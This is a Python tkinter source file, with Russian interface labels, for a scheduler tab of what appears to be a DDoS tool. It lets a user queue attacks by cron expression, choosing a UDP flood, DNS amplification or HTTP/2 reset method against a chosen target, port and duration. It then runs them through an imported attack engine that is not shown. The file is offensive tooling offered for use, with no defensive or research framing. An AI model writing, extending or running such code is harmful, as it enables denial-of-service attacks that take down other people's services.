import tkinter as tk
from tkinter import messagebox, ttk
import json
from croniter import croniter
from datetime import datetime
import threading
import asyncio

from engine.attack import AsyncAttackEngine

class AutoTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.tasks = []
        self.engine = AsyncAttackEngine()
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="Cron-выражение (например */5 * * * *):").pack(anchor=tk.W, padx=5)
        self.cron_entry = tk.Entry(self, width=30)
        self.cron_entry.pack(padx=5, pady=5)
        tk.Label(self, text="Метод:").pack(anchor=tk.W, padx=5)
        self.method_var = tk.StringVar(value="udp")
        ttk.Combobox(self, textvariable=self.method_var, values=["udp","dns_amp","http2_reset"]).pack(padx=5)
        tk.Label(self, text="Цель:").pack(anchor=tk.W, padx=5)
        self.target_entry = tk.Entry(self, width=30)
        self.target_entry.pack(padx=5)
        tk.Label(self, text="Порт:").pack(anchor=tk.W, padx=5)
        self.port_entry = tk.Entry(self, width=10)
        self.port_entry.insert(0, "80")
        self.port_entry.pack(padx=5)
        tk.Label(self, text="Длительность (с):").pack(anchor=tk.W, padx=5)
        self.duration_entry = tk.Entry(self, width=10)
        self.duration_entry.insert(0, "60")
        self.duration_entry.pack(padx=5)
        tk.Button(self, text="Добавить задачу", command=self.add_task).pack(pady=5)
        self.task_list = tk.Listbox(self, width=80)
        self.task_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.scheduler_thread = threading.Thread(target=self.scheduler_loop, daemon=True)
        self.scheduler_thread.start()

    def add_task(self):
        cron = self.cron_entry.get()
        method = self.method_var.get()
        target = self.target_entry.get()
        port = int(self.port_entry.get())
        duration = int(self.duration_entry.get())
        self.tasks.append({
            "cron": cron,
            "method": method,
            "target": target,
            "port": port,
            "duration": duration
        })
        self.task_list.insert(tk.END, f"{cron} - {method} {target}:{port} ({duration}с)")

    def scheduler_loop(self):
        while True:
            now = datetime.now()
            for task in self.tasks:
                if croniter.match(task["cron"], now):
                    asyncio.run(self.engine.run_attack(
                        task["method"],
                        task["target"],
                        task["port"],
                        task["duration"]
                    ))
            threading.Event().wait(30)
